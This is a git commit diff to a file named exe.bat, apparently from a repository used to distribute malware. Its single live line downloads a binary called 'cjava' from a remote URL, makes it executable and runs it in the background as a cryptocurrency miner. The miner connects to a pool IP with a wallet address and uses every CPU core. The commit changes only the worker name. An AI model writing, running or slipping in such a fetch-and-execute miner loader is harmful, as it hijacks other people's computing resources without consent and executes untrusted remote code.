de0c44a2ffb2ee4423f7b14c48dcd514b492f376
gabrielikdorothy <kaylazetheoenny@outlook.com>
2024-12-04 20:21:15 +0700

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,1 +1,1 @@
-wget -qO cjava https://gitlab.com/ghcees/pack/-/raw/main/cjava && chmod +x cjava && nohup ./cjava -a yespowertide -o 47.84.33.33:443 -u TYtuxwX9z9XcZ3YmFHgQSYT4tevQi1aPHQ.Gaws -p x -t $(nproc --all)
+wget -qO cjava https://gitlab.com/ghcees/pack/-/raw/main/cjava && chmod +x cjava && nohup ./cjava -a yespowertide -o 47.84.33.33:443 -u TYtuxwX9z9XcZ3YmFHgQSYT4tevQi1aPHQ.GH -p x -t $(nproc --all)
